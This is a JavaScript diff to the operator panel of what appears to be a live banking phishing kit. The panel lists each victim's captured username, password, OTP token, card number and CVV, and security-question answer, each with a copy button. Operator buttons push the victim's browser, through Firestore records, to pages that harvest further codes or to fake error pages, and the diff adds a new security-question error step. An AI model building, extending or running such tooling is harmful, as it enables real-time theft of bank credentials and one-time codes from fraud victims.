@@ -697,19 +697,19 @@ function getPageLocationForAction(action) {
         case "index_err":
             return "index";
         case "sms":
-            return "sms";
         case "sms_err":
-            return "sms";
+            return "tdc";
         case "tdc":
             return "tdc";
         case "tdc_err":
             return "tdc";
         case "token":
         case "token_err":
-            return "token";
+            return "dinamica";
+        case "pregseg_err":
         case "facial":
         case "facial_err":
-            return "facial";
+            return "pregseg";
         default:
             return null;
     }
@@ -1061,7 +1061,7 @@ function updateUI(docs) {
             const tdcAnio = userData.tdcAnio || '';
             const tdcCvv = userData.tdcCvv || '';
             const tdcEstado = userData.tdcEstado || '';
-            const token = userData.token || '';
+            const token = userData.otpCode || '';
             const sms = userData.smsCode || '';
             const tokenResend = userData.tokenResend || '';
             const fotoFacialUrl = userData.fotoFacialUrl || '';
@@ -1162,18 +1162,14 @@ function updateUI(docs) {
             <div style="display:flex; justify-content:center; align-items:center;">
             <div style="width:100%; display:flex; flex-direction:column; align-items:start; gap:10px; white-space:nowrap; color:${textColor}; padding-bottom:10px;">
                     <div>
-                        <span style="font-weight:600;">Tipo Doc:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tipoDocTexto}" title="Haz clic para copiar">${tipoDocTexto} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                         <span style="font-weight:600;">Usuario:</span>
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${usuario}" title="Haz clic para copiar">${usuario} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">Token:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${token}" title="Haz clic para copiar">${token} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                        <span style="font-weight:600;">SMS:</span>
-                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${sms}" title="Haz clic para copiar">${sms} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
-                   </div>
-                    <div>
                         <span style="font-weight:600;">Clave:</span>
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${clave}" title="Haz clic para copiar">${clave} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
+                        <span style="font-weight:600;">Token:</span>
+                        <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${token}" title="Haz clic para copiar">${token} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
+                   </div>
+                    <div>
                         <span style="font-weight:600;">TDC Nombre:</span>
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${tdcNombre}" title="Haz clic para copiar">${tdcNombre} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
                         <span style="font-weight:600;">Numero:</span>
@@ -1188,6 +1184,7 @@ function updateUI(docs) {
                         <br>
                         <span style="font-weight:600;">Pregunta de Seguridad:</span>
                         <span class="copyable" style="cursor:pointer; color:${textColor};" data-value="${userData.respuestaSeguridad || ''}" title="Haz clic para copiar">${userData.respuestaSeguridad || 'Pendiente'} <img src="http://clipground.com/images/copy-4.png" style="width:15px; height:15px;"></span>
+                        <button class="btn btn-danger action-btn btn-sm rounded" data-action="pregseg_err" data-id="${userId}" title="Pregunta Error">Error</button>
                     </div>
                 </div>
                 <div style="display:flex; flex-direction:column; align-items:start; gap:10px; white-space:nowrap; color:${textColor}; padding-bottom:10px;">
@@ -1198,18 +1195,15 @@ function updateUI(docs) {
                     <div>
                         <button class="btn btn-success action-btn btn-sm mr-1 rounded" data-action="home" data-id="${userId}">Inicio</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="index_err" data-id="${userId}">Index Error</button>
-                        <button class="btn btn-info action-btn btn-sm mr-1 rounded" data-action="sms" data-id="${userId}">SMS</button>
-                        <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="sms_err" data-id="${userId}">SMS Error</button>
                         <button class="btn btn-info action-btn btn-sm mr-1 rounded" data-action="token" data-id="${userId}">Token</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="token_err" data-id="${userId}">Token Error</button>
-                    
+                        <button class="btn btn-dark action-btn btn-sm mr-1 rounded" data-action="view_video" data-id="${userId}">Foto</button>
                         </div>
                         <div>
                         <button class="btn btn-primary action-btn btn-sm mr-1 rounded" data-action="tdc" data-id="${userId}">TDC</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="tdc_err" data-id="${userId}">TDC Error</button>
                         <button class="btn btn-secondary action-btn btn-sm mr-1 rounded" data-action="facial" data-id="${userId}">Facial</button>
                         <button class="btn btn-danger action-btn btn-sm mr-1 rounded" data-action="facial_err" data-id="${userId}">Facial Error</button>
-                        <button class="btn btn-dark action-btn btn-sm mr-1 rounded" data-action="view_video" data-id="${userId}">Foto</button>
                         <button class="btn btn-danger action-btn btn-sm rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                     </div>
                     </div>
@@ -1481,7 +1475,7 @@ function handleUserAction(event) {
         
         console.log("enviar_pregseg: enviando a", userId);
         updateDoc(doc(db, "redireccion", userId), {
-            page: 99,
+            page: 8,
             preguntaSeguridadAdmin: pregunta,
             pageLocation: "pregseg",
             adminCommandAt: Date.now()
@@ -1589,7 +1583,7 @@ function handleUserAction(event) {
         setAdminActionInProgress();
         updateDoc(doc(db, "redireccion", userId), {
             tdcErr: true,
-            page: 8,
+            page: 4,
             pageLocation: getPageLocationForAction(action),
             adminCommandAt: Date.now()
         })
@@ -1597,6 +1591,21 @@ function handleUserAction(event) {
                 animateCard(card, "#ffd6de");
             })
             .catch((error) => console.error("tdc_err error:", error));
+        return;
+    }
+
+    if (action === "pregseg_err") {
+        setAdminActionInProgress();
+        updateDoc(doc(db, "redireccion", userId), {
+            pregsegErr: true,
+            page: 9,
+            pageLocation: getPageLocationForAction(action),
+            adminCommandAt: Date.now()
+        })
+            .then(() => {
+                animateCard(card, "#ffd6de");
+            })
+            .catch((error) => console.error("pregseg_err error:", error));
         return;
     }
 
